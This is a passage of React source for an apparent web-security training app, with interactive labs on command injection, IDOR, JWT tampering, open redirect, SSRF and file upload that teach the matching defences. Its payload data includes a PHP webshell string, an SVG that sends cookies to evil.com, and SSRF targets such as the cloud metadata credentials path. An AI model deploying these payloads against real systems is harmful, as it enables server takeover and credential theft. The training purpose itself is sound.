          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.parameterized} onChange={v=>{setDef(d=>({...d,parameterized:v})); reset();}} label="Parameterized Execution" desc="Use execvp() array — no shell spawned, metacharacters are inert"/>
              <Toggle enabled={def.sanitize}      onChange={v=>{setDef(d=>({...d,sanitize:v})); reset();}}      label="Input Sanitization"     desc="Strip ; | && $ ` and other shell metacharacters from input"/>
              <Toggle enabled={def.allowlist}     onChange={v=>{setDef(d=>({...d,allowlist:v})); reset();}}     label="Input Allowlist"        desc="Only permit valid IP/hostname characters: [a-z0-9.-]"/>
            </div>
            <button onClick={run}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Run Diagnostic
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Shell Command Constructed</SectionHead>
            <pre className="bg-slate-950 border border-slate-700 rounded-lg p-3 font-mono text-xs text-amber-300 overflow-x-auto whitespace-pre-wrap">{builtCmd()}</pre>
            {isInjection && !def.parameterized && (
              <p className="mt-2 text-[11px] text-slate-600">The shell treats <code className="text-slate-500">;</code> <code className="text-slate-500">|</code> <code className="text-slate-500">&amp;&amp;</code> as command separators — everything after runs as a separate command.</p>
            )}
          </Card>
          <Card>
            <SectionHead>Terminal Output</SectionHead>
            <div className="bg-slate-950 rounded-lg border border-slate-800 p-3 font-mono" style={{minHeight:120}}>
              {labState === "idle" && <span className="text-xs text-slate-700">$ Run the diagnostic to see output…</span>}
              {(labState === "neutral") && result && <pre className="text-xs text-green-400 whitespace-pre-wrap">{result.output}</pre>}
              {labState === "success" && result && (
                <div>
                  <pre className="text-xs text-green-400">PING 8.8.8.8 56 bytes…</pre>
                  <div className="text-xs text-green-400 border-t border-slate-800 pt-2 mt-2">[Blocked] {result.reason}</div>
                </div>
              )}
              {labState === "fail" && result && <pre className="text-xs text-red-300 whitespace-pre-wrap">{result.output}</pre>}
            </div>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">Parameterized Execution</strong> and click <strong>Run Diagnostic</strong>. The shell command preview switches to an <code className="text-slate-400">execvp()</code> array call — no shell is ever spawned, so the <code className="text-slate-400">;</code> character after the IP is just a data character, not a command separator. The terminal shows only the ping result.</p>}
        failMsg="The injected command ran on the server. Enable a defense and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── IDOR / BROKEN ACCESS CONTROL LAB ─────────────────────────────────────────
const IDORLab = ({ addLog, addScore, onBack }) => {
  const CURRENT_ID = 1042;
  const [recordId, setRecordId] = useState(CURRENT_ID);
  const [def, setDef]           = useState({ authCheck:false, indirectRef:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const fetchRecord = () => {
    const isOwn = recordId === CURRENT_ID;
    if (isOwn) { setResult({ own:true, record:FAKE_RECORDS[CURRENT_ID] }); setLabState("neutral"); return; }
    const record = FAKE_RECORDS[recordId];
    if (!record) { setResult({ notFound:true }); setLabState("neutral"); return; }
    const blocked = def.authCheck || def.indirectRef;
    if (blocked) {
      const reason = def.indirectRef
        ? "Record IDs are non-sequential UUIDs in this system — this integer ID resolves to nothing"
        : `403 Forbidden: record #${recordId} does not belong to the requesting user (Jane, #${CURRENT_ID})`;
      setResult({ blocked:true, reason });
      setLabState("success");
      addLog(mkEvent("idor","Attacker","Patient Portal","info","IDOR blocked"));
      const key = [def.authCheck,def.indirectRef,recordId].join("|");
      if (!scoredRef.current.has(key)) { addScore("idor",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setResult({ exposed:true, record });
      setLabState("fail");
      addLog(mkEvent("idor","Attacker","Patient Portal","critical",`IDOR: patient #${recordId} data exposed`));
    }
  };

  const idorReveal = (
    <p>Enable <strong className="text-slate-200">Server-side Authorization</strong>: before returning any record, verify the requesting user's ID matches the record's owner ID. Never rely on the client to enforce access boundaries. As a secondary layer, <strong className="text-slate-200">Indirect References</strong> replace guessable sequential IDs with long random UUIDs — enumeration becomes impractical, but authorization checks are still required.</p>
  );

  const successContent = (
    <div>
      <p>{result?.reason || "Unauthorized access was blocked."}{" "}Authentication (who you are) and Authorization (what you are allowed to access) are separate concerns. Most frameworks handle authentication globally, but per-object authorization must be implemented explicitly for each endpoint that returns user-specific data.</p>
    </div>
  );

  const RecordDisplay = ({ record, isOwn }) => (
    <div className={`rounded-xl border p-3 ${isOwn ? "border-slate-700" : "border-red-500/40 bg-red-900/10"}`}>
      {!isOwn && <div className="text-xs text-red-400 font-semibold mb-2 flex items-center gap-1.5"><AlertTriangle size={11}/> Unauthorised — another patient's record</div>}
      <div className="grid grid-cols-2 gap-x-4 gap-y-1.5">
        {[["Name",record.name],["Date of Birth",record.dob],["Blood Type",record.blood],["Diagnosis",record.diagnosis],["Medication",record.meds],["Physician",record.physician],["Last Visit",record.lastVisit]].map(([k,v])=>(
          <div key={k}>
            <div className="text-[10px] text-slate-600">{k}</div>
            <div className={`text-xs font-semibold mt-0.5 ${isOwn?"text-slate-200":"text-red-200"}`}>{v}</div>
          </div>
        ))}
      </div>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Broken Access Control (IDOR)" subtitle="Prevent enumeration of sequential IDs from exposing other users' data" onBack={onBack}/>

      <ChallengeBox accent="purple" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={idorReveal}>
        You are Jane, patient <strong>#1042</strong> at MediPortal. The API is <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">GET /api/records/1042</code>. Change the ID to <strong>1043</strong> to attempt to read another patient's private medical record. Configure defenses to block it.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Session & Request</SectionHead>
            <div className="bg-slate-800/50 border border-slate-700 rounded-lg p-3 text-xs mb-3 flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-green-500"/>
              <span className="text-slate-400">Logged in as <strong className="text-white">Jane Doe</strong> — Patient ID <span className="font-mono text-cyan-400">{CURRENT_ID}</span></span>
            </div>
            <label className="text-xs text-slate-600 block mb-1">GET /api/records/<strong className="text-slate-400 font-mono">{recordId}</strong></label>
            <input type="number" className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-sm rounded-lg px-3 py-2"
              value={recordId} onChange={e=>{setRecordId(Math.floor(Number(e.target.value))||CURRENT_ID); reset();}}/>
            <div className="flex gap-1.5 mt-2">
              {[1042,1043,1044].map(id=>(
                <button key={id} onClick={()=>{setRecordId(id); reset();}}
                  className={`text-xs px-2.5 py-1.5 rounded-lg border transition-colors flex-1 ${recordId===id?"bg-slate-700 border-slate-600 text-white":"border-slate-700 text-slate-600 hover:text-slate-400"}`}>
                  #{id} {id===CURRENT_ID?"(you)":""}
                </button>
              ))}
            </div>
            {recordId !== CURRENT_ID && <div className="mt-2 flex items-center gap-1.5 text-xs text-amber-400"><AlertTriangle size={11}/> Requesting another patient's record</div>}
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.authCheck}   onChange={v=>{setDef(d=>({...d,authCheck:v})); reset();}}   label="Server-side Authorization" desc="Verify requester owns the record before returning it"/>
              <Toggle enabled={def.indirectRef} onChange={v=>{setDef(d=>({...d,indirectRef:v})); reset();}} label="Indirect References"        desc="Use random UUIDs instead of sequential IDs — enumeration is impractical"/>
            </div>
            <button onClick={fetchRecord}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Fetch Record
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>API Response</SectionHead>
            {labState === "idle" && <div className="text-center text-slate-700 text-xs py-10">Fetch a record to see the response</div>}
            {labState === "neutral" && result?.own && (
              <div><div className="text-xs text-green-400 mb-2">200 OK — your own record</div><RecordDisplay record={result.record} isOwn={true}/></div>
            )}
            {labState === "neutral" && result?.notFound && (
              <div className="bg-slate-800/40 border border-slate-700 rounded-lg p-3 text-xs text-slate-500">404 Not Found — no record with ID {recordId}</div>
            )}
            {labState === "success" && result?.blocked && (
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs">
                <div className="text-green-400 font-semibold mb-1">403 Forbidden</div>
                <div className="text-slate-400">{result.reason}</div>
              </div>
            )}
            {labState === "fail" && result?.exposed && (
              <div><div className="text-xs text-red-400 mb-2 flex items-center gap-1.5"><AlertTriangle size={11}/> 200 OK — data exposed without authorisation</div><RecordDisplay record={result.record} isOwn={false}/></div>
            )}
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Set the record ID to <strong className="text-slate-200">1043</strong>, enable <strong className="text-slate-200">Server-side Authorization</strong>, then click <strong>Fetch Record</strong>. The server checks that the requesting user (Jane, #1042) is not the owner of record #1043 and returns 403 Forbidden — Bob's medical data stays protected.</p>}
        failMsg="Another patient's private medical record was returned without authorisation. Enable a defense and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── JWT TAMPERING LAB ─────────────────────────────────────────────────────────
const JWTLab = ({ addLog, addScore, onBack }) => {
  const [tampered, setTampered] = useState(false);
  const [def, setDef]           = useState({ verifySig:false, rejectNone:false, strongSecret:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const payloadB64 = tampered ? JWT_TAMP_B64 : JWT_ORIG_B64;
  // Note: token string is assembled from its parts directly in the Token Inspector JSX below
  const origClaims  = { sub:"user_9f2a", name:"Jane Doe", role:"user",  iat:1709000000, exp:1709086400 };
  const tampClaims  = { sub:"user_9f2a", name:"Jane Doe", role:"admin", iat:1709000000, exp:1709086400 };
  const currentClaims = tampered ? tampClaims : origClaims;

  const submit = () => {
    if (!tampered) { setResult({ ok:true, note:"Original token — signature valid, role: user" }); setLabState("neutral"); return; }
    const blocked = def.verifySig || def.rejectNone || def.strongSecret;
    if (blocked) {
      const reason = def.verifySig      ? `Signature mismatch: HMAC(header+modifiedPayload, secret) ≠ "${JWT_SIG}"`
                   : def.rejectNone     ? "Algorithm enforcement: only known-good alg values accepted on a strict allowlist"
                   : "Strong secret: the 256-bit secret cannot be brute-forced to forge a valid signature";
      setResult({ ok:false, reason });
      setLabState("success");
      addLog(mkEvent("jwt","Attacker","API","info","Tampered JWT rejected"));
      const key = [def.verifySig,def.rejectNone,def.strongSecret].join("|");
      if (!scoredRef.current.has(key)) { addScore("jwt",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setResult({ ok:true, escalated:true, note:"Server decoded payload without verifying signature — role: admin granted" });
      setLabState("fail");
      addLog(mkEvent("jwt","Attacker","API","critical","JWT privilege escalation — admin access granted"));
    }
  };

  const jwtReveal = (
    <p>Enable <strong className="text-slate-200">Signature Verification</strong>: the server must recompute <code className="text-slate-400">HMAC(header+payload, secret)</code> and compare it to the provided signature on every request. If the payload was modified, the hashes won't match and the token must be rejected. Also enforce <strong className="text-slate-200">Reject alg:none</strong> and use a <strong className="text-slate-200">Strong Secret</strong> (256-bit random) — never skip verification.</p>
  );

  const successContent = (
    <div>
      <p>{result?.reason || "The tampered token was rejected."}{" "}JWTs are not encrypted — anyone can decode and modify the payload. Security comes entirely from the signature proving the payload hasn't changed since it was issued. A server that skips verification trusts whatever claims appear in the token.</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="JWT Tampering" subtitle="Prevent privilege escalation via unsigned or forged authentication tokens" onBack={onBack}/>

      <ChallengeBox accent="blue" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={jwtReveal}>
        You receive a JWT with <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">"role":"user"</code>. Click <strong>Tamper Token</strong> to change it to <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">"role":"admin"</code> while keeping the original signature unchanged. Configure server-side validation, then submit the token.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Token State</SectionHead>
            <div className="flex gap-2 mb-3">
              <button onClick={()=>{setTampered(false); reset();}}
                className={`flex-1 text-xs py-2 rounded-lg border transition-colors ${!tampered?"bg-slate-700 border-slate-500 text-white":"bg-slate-900 border-slate-700 text-slate-500 hover:text-slate-300"}`}>
                Original Token
              </button>
              <button onClick={()=>{setTampered(true); reset();}}
                className={`flex-1 text-xs py-2 rounded-lg border transition-colors ${tampered?"bg-red-800 border-red-600 text-white":"bg-slate-900 border-slate-700 text-slate-500 hover:text-red-400"}`}>
                ⚠ Tamper Token
              </button>
            </div>
            {tampered && (
              <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-2 text-[11px] text-red-400">
                Payload modified: <code>role: "user" → "admin"</code><br/>
                <span className="text-slate-500">Signature left unchanged (still the original valid sig)</span>
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.verifySig}     onChange={v=>{setDef(d=>({...d,verifySig:v})); reset();}}     label="Verify Signature"   desc="Recompute HMAC on every request; reject if it doesn't match"/>
              <Toggle enabled={def.rejectNone}    onChange={v=>{setDef(d=>({...d,rejectNone:v})); reset();}}    label="Reject alg:none"    desc="Enforce algorithm allowlist — never accept unsigned tokens"/>
              <Toggle enabled={def.strongSecret}  onChange={v=>{setDef(d=>({...d,strongSecret:v})); reset();}}  label="Strong Secret"      desc="256-bit random secret — brute-force key recovery is infeasible"/>
            </div>
            <button onClick={submit}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Submit Token
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Token Inspector</SectionHead>
            <div className="bg-slate-950 rounded-lg border border-slate-800 p-2 mb-3 font-mono text-[9px] break-all leading-relaxed">
              <span className="text-red-400">{JWT_HEADER_B64}</span>
              <span className="text-slate-600">.</span>
              <span className={tampered ? "text-amber-300" : "text-green-400"}>{payloadB64}</span>
              <span className="text-slate-600">.</span>
              <span className="text-blue-400">{JWT_SIG}</span>
            </div>
            <div className="space-y-2">
              <div>
                <div className="text-[10px] text-red-400 font-semibold mb-1">Header (algorithm)</div>
                <pre className="bg-slate-800 rounded p-2 text-[11px] font-mono text-slate-300">{`{ "alg": "HS256", "typ": "JWT" }`}</pre>
              </div>
              <div>
                <div className={`text-[10px] font-semibold mb-1 ${tampered ? "text-amber-400" : "text-green-400"}`}>Payload (claims){tampered && " — MODIFIED"}</div>
                <pre className={`bg-slate-800 rounded p-2 text-[11px] font-mono whitespace-pre-wrap ${tampered ? "text-amber-300" : "text-slate-300"}`}>{JSON.stringify(currentClaims, null, 2)}</pre>
              </div>
              <div>
                <div className={`text-[10px] font-semibold mb-1 ${tampered ? "text-red-400" : "text-blue-400"}`}>Signature{tampered && " — now invalid (payload changed)"}</div>
                <div className="bg-slate-800 rounded p-2 text-[11px] font-mono text-blue-300 break-all">{JWT_SIG}</div>
              </div>
            </div>
          </Card>

          {labState !== "idle" && (
            <Card>
              <SectionHead>API Response</SectionHead>
              {labState === "neutral" && <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs"><div className="text-green-400 font-semibold mb-1">200 OK</div><div className="text-slate-400">Welcome, Jane. Access level: <span className="text-white">user</span></div></div>}
              {labState === "success" && result && <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs"><div className="text-green-400 font-semibold mb-1">401 Unauthorised</div><div className="text-slate-400">{result.reason}</div></div>}
              {labState === "fail" && result && (
                <div className="bg-red-900/20 border border-red-500/40 rounded-lg p-3 text-xs">
                  <div className="text-red-400 font-semibold mb-1">200 OK — privilege escalation succeeded ⚠</div>
                  <div className="text-slate-400 mb-1">{result.note}</div>
                  <div className="text-red-300 font-semibold">Access level: admin — full system access granted</div>
                </div>
              )}
            </Card>
          )}
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Click <strong className="text-slate-200">Tamper Token</strong> (the payload changes to <code className="text-slate-400">role: "admin"</code>), then enable <strong className="text-slate-200">Verify Signature</strong> and click <strong>Submit Token</strong>. The server recomputes the HMAC of the new payload and finds it doesn't match the original signature still attached to the token — 401 Unauthorised.</p>}
        failMsg="The tampered token was accepted and admin access was granted. The server decoded the payload without verifying the signature. Enable a defense and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};


// ─── PAGE 3 DATA ──────────────────────────────────────────────────────────────
const REDIRECT_PAYLOADS = [
  { id:"rd1", label:"Phishing lookalike",   val:"https://paypa1-bank.com/login",              sev:"high"     },
  { id:"rd2", label:"Session exfiltration", val:"https://attacker.com/?token=sess_abc123",    sev:"critical" },
  { id:"rd3", label:"OAuth abuse",          val:"https://evil.com/cb?code=AUTHCODE_xyz",      sev:"high"     },
  { id:"rd4", label:"Relative path (safe)", val:"/dashboard",                                 sev:"info"     },
  { id:"rd5", label:"Trusted domain (safe)",val:"https://docs.example.com/help",              sev:"info"     },
];
const ALLOWED_REDIRECT_HOSTS = ["docs.example.com","support.example.com","example.com"];

const SSRF_PAYLOADS = [
  { id:"ss1", label:"AWS metadata",     val:"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-prod", sev:"critical" },
  { id:"ss2", label:"Internal Redis",   val:"http://localhost:6379/",                                                      sev:"critical" },
  { id:"ss3", label:"Internal admin",   val:"http://10.0.0.100:8080/admin/users",                                         sev:"high"     },
  { id:"ss4", label:"External (safe)",  val:"https://api.example.com/v2/docs",                                            sev:"info"     },
];
const FAKE_SSRF_RESPONSES = {
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-prod":
    `{\n  "AccessKeyId": "ASIA4EXAMPLE12345",\n  "SecretAccessKey": "wJalrXUtnFEMI/EXAMPLE+KEY",\n  "Token": "AQoDYXdzEJr//////////wEaoAK1wvxJY12r2...",\n  "Expiration": "2025-01-15T23:59:59Z"\n}`,
  "http://localhost:6379/":
    `-ERR unknown command\r\n*3\r\n$3\r\nSET\r\n$8\r\npassword\r\n$14\r\nsecret_redis_pw\r\n+OK\r\n`,
  "http://10.0.0.100:8080/admin/users":
    `{"users":[{"id":1,"email":"admin@corp.com","role":"superadmin","pw_hash":"$2b$12$abc..."},{"id":2,"email":"devops@corp.com","role":"admin"}],"total":2}`,
  "https://api.example.com/v2/docs":
    `{"version":"2.0","endpoints":["/users","/orders","/products"],"auth":"Bearer token required","status":"ok"}`,
};
const PRIVATE_IP_RE = /^https?:\/\/(localhost|127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.)/i;

const UPLOAD_FILES = [
  { id:"fu1", label:"PHP webshell (.php)",         name:"shell.php",       mime:"application/x-php",  magic:"PHP",  content:'<?php system($_GET["cmd"]); ?>', sev:"critical" },
  { id:"fu2", label:"PHP disguised as .jpg",        name:"shell.php.jpg",   mime:"image/jpeg",         magic:"PHP",  content:'<?php system($_GET["cmd"]); ?>', sev:"critical" },
  { id:"fu3", label:"SVG with embedded script",     name:"xss.svg",         mime:"image/svg+xml",      magic:"SVG",  content:"<svg><script>fetch('//evil.com?c='+document.cookie)</script></svg>", sev:"high" },
  { id:"fu4", label:"Legitimate JPEG photo",        name:"photo.jpg",       mime:"image/jpeg",         magic:"JPEG", content:"[Binary JPEG data — 142 KB — normal image]", sev:"info" },
];
const SEC_HEADERS = {
  csp:         { label:"Content-Security-Policy",   value:"default-src 'self'", attack:"XSS",         risk:"Inline scripts and external resources execute with full page trust" },
  xfo:         { label:"X-Frame-Options",           value:"DENY",               attack:"Clickjacking", risk:"Page can be embedded in a transparent iframe to hijack user clicks" },
  hsts:        { label:"Strict-Transport-Security", value:"max-age=31536000",   attack:"MITM / Downgrade", risk:"Browser may connect over HTTP, exposing credentials to interception" },
  xcto:        { label:"X-Content-Type-Options",    value:"nosniff",            attack:"MIME Sniffing", risk:"Browser may execute uploaded text files as scripts" },
  refpolicy:   { label:"Referrer-Policy",           value:"strict-origin-when-cross-origin", attack:"Referrer Leakage", risk:"Full URL (with tokens, paths) sent to third-party sites in Referer header" },
};

// ─── DASHBOARD MODULE DEFINITIONS P3 ─────────────────────────────────────────
const DASH_MODULES_P3 = [
  {
    id:"openredirect", Icon:ExternalLink, label:"Open Redirect", difficulty:"Beginner",
    shortDesc:"Abusing redirect endpoints as phishing launchers",
    fullDesc:"Open redirects let attackers craft legitimate-looking URLs that silently send users to malicious sites. A link like app.com/redirect?url=evil.com looks trustworthy but delivers the victim to the attacker — often used to steal OAuth tokens or bypass phishing filters.",
    concepts:["URL Allowlisting","Relative-Path Enforcement","Redirect Confirmation"],
    color:"amber",
  },
  {
    id:"clickjacking", Icon:Layers, label:"Clickjacking", difficulty:"Beginner",
    shortDesc:"Transparent iframe overlays that hijack clicks",
    fullDesc:"Clickjacking overlays a transparent iframe of a legitimate site on top of an attacker's page. When the victim clicks what looks like an attacker's button, they are actually clicking a hidden button on the legitimate site — triggering transfers, account changes, or likes.",
    concepts:["X-Frame-Options","CSP frame-ancestors","Frame-Busting JS"],
    color:"orange",
  },
  {
    id:"ssrf", Icon:Globe, label:"Server-Side Request Forgery", difficulty:"Intermediate",
    shortDesc:"Tricking the server into fetching internal resources",
    fullDesc:"SSRF tricks the server into making HTTP requests to internal services on the attacker's behalf. Because the request comes from the server itself, it can reach internal APIs, cloud metadata endpoints, and databases that are not reachable from the internet.",
    concepts:["URL Allowlisting","Private IP Blocking","Egress Filtering"],
    color:"red",
  },
  {
    id:"fileupload", Icon:Download, label:"File Upload Bypass", difficulty:"Intermediate",
    shortDesc:"Bypassing upload filters to plant executable code",
    fullDesc:"Upload filters that check only file extensions or Content-Type headers can be bypassed because both are attacker-controlled. A PHP webshell named shell.php.jpg with a spoofed image/jpeg MIME type passes extension and header checks while still executing as PHP on the server.",
    concepts:["Magic Byte Analysis","Extension Allowlisting","Out-of-Webroot Storage"],
    color:"purple",
  },
  {
    id:"secheaders", Icon:Shield, label:"Security Headers Audit", difficulty:"Beginner",
    shortDesc:"Configuring HTTP headers to eliminate browser-level attacks",
    fullDesc:"Missing HTTP response headers leave browsers vulnerable to a range of attacks: XSS, clickjacking, downgrade attacks, MIME sniffing, and credential leakage via the Referer header. Each header is a single server-side change that closes one attack surface.",
    concepts:["CSP","X-Frame-Options","HSTS","X-Content-Type-Options","Referrer-Policy"],
    color:"blue",
  },
];

// ─── OPEN REDIRECT LAB ────────────────────────────────────────────────────────
const OpenRedirectLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("rd1");
  const [url, setUrl]           = useState(REDIRECT_PAYLOADS[0].val);
  const [def, setDef]           = useState({ allowlist:false, relativeOnly:false, confirmation:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const isAbsolute   = /^https?:\/\//i.test(url);
  const isSafe       = !isAbsolute || (() => { try { return ALLOWED_REDIRECT_HOSTS.includes(new URL(url).hostname); } catch { return false; } })();
  const targetDomain = isAbsolute ? (() => { try { return new URL(url).hostname; } catch { return url; } })() : "(same site)";

  const visit = () => {
    if (!isAbsolute || isSafe) { setResult({ safe:true, destination: url }); setLabState("neutral"); return; }
    const blocked = def.allowlist || def.relativeOnly || def.confirmation;
    const reason  = def.relativeOnly   ? "Relative-path-only policy: absolute URLs are rejected at the redirect handler"
                  : def.allowlist      ? `Allowlist check failed: "${targetDomain}" is not a trusted redirect destination`
                  : "Redirect intercepted — user shown confirmation page before proceeding";
    if (blocked) {
      setResult({ blocked:true, reason, destination: url });
      setLabState("success");
      addLog(mkEvent("openredirect","Attacker","App Server","info",`Open redirect blocked → ${targetDomain}`));
      const key = [def.allowlist,def.relativeOnly,def.confirmation,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("openredirect",25); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setResult({ blocked:false, destination: url });
      setLabState("fail");
      addLog(mkEvent("openredirect","Attacker","Browser","high",`Open redirect followed → ${targetDomain}`));
    }
  };

  const pick = (id) => { setSelId(id); const p=REDIRECT_PAYLOADS.find(x=>x.id===id); if(p)setUrl(p.val); reset(); };

  const rdReveal = (
    <p>The safest fix is <strong className="text-slate-200">Relative-Path Enforcement</strong>: only accept redirect targets starting with <code className="text-slate-400">/</code> — an absolute URL can never be expressed as a relative path, so external redirects are structurally impossible. An <strong className="text-slate-200">Allowlist</strong> of trusted domains is the right choice when you genuinely need cross-domain redirects. A <strong className="text-slate-200">Confirmation Page</strong> is a user-facing mitigation but doesn't prevent the redirect.</p>
  );
  const successContent = (
    <div>
      <p>{result?.reason || "The redirect was blocked."}{" "}Open redirects are frequently used as the final hop in phishing chains: the attacker's email links to your trusted domain, bypassing email filters, then instantly redirects to the phishing page.</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Open Redirect" subtitle="Prevent redirect endpoints from sending users to attacker-controlled sites" onBack={onBack}/>
      <ChallengeBox accent="amber" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={rdReveal}>
        Your app has a <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">?next=</code> redirect parameter. An attacker crafts a link pointing at your legitimate domain that silently forwards victims to a phishing site. Configure the redirect handler, then click <strong>Follow Link</strong>.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Redirect Target URL</SectionHead>
            <select className="w-full bg-slate-800 border border-slate-700 text-slate-300 text-sm rounded-lg px-3 py-2 mb-3"
              value={selId} onChange={e=>pick(e.target.value)}>
              {REDIRECT_PAYLOADS.map(p=><option key={p.id} value={p.id}>{p.label} — {p.sev}</option>)}
            </select>
            <label className="text-xs text-slate-600 block mb-1">?next= value</label>
            <input className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-sm rounded-lg px-3 py-2"
              value={url} onChange={e=>{setUrl(e.target.value); reset();}}/>
            <div className="mt-2 bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 font-mono text-[11px]">
              <span className="text-slate-600">GET </span>
              <span className="text-amber-300">https://app.example.com/redirect</span>
              <span className="text-slate-600">?next=</span>
              <span className={isAbsolute && !isSafe ? "text-red-400" : "text-green-400"}>{url}</span>
            </div>
            {isAbsolute && !isSafe && (
              <div className="mt-2 flex items-center gap-1.5 text-xs text-red-400">
                <AlertTriangle size={12}/> External domain: <span className="font-mono">{targetDomain}</span>
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.relativeOnly}  onChange={v=>{setDef(d=>({...d,relativeOnly:v})); reset();}}  label="Relative Paths Only"    desc="Reject any next= value starting with http:// or https://"/>
              <Toggle enabled={def.allowlist}     onChange={v=>{setDef(d=>({...d,allowlist:v})); reset();}}     label="Domain Allowlist"       desc="Only redirect to pre-approved trusted domains"/>
              <Toggle enabled={def.confirmation}  onChange={v=>{setDef(d=>({...d,confirmation:v})); reset();}}  label="Confirmation Page"      desc="Show an interstitial page before any external redirect"/>
            </div>
            <button onClick={visit}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Follow Link
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Simulated Browser</SectionHead>
            <div className="rounded-lg overflow-hidden border border-slate-700">
              <div className="bg-slate-700 px-3 py-2 flex items-center gap-2">
                <div className="flex gap-1">
                  {["bg-red-500/50","bg-amber-500/50","bg-green-500/50"].map(c=><div key={c} className={`w-2 h-2 rounded-full ${c}`}/>)}
                </div>
                <div className="bg-slate-600 rounded px-2 py-0.5 text-[10px] font-mono text-slate-400 flex-1 truncate">
                  {labState==="fail" ? url : labState==="neutral"&&result?.safe ? `app.example.com${url}` : "app.example.com/redirect?next=…"}
                </div>
              </div>
              <div className="bg-slate-950 p-4" style={{minHeight:160}}>
                {labState === "idle" && <p className="text-center text-slate-700 text-xs pt-8">Click "Follow Link" to simulate the redirect</p>}
                {labState === "neutral" && (
                  <div className="text-center">
                    <div className="text-green-400 text-sm font-semibold mb-1">✓ Redirected safely</div>
                    <div className="text-slate-500 text-xs">Destination: <span className="font-mono text-slate-300">{url}</span></div>
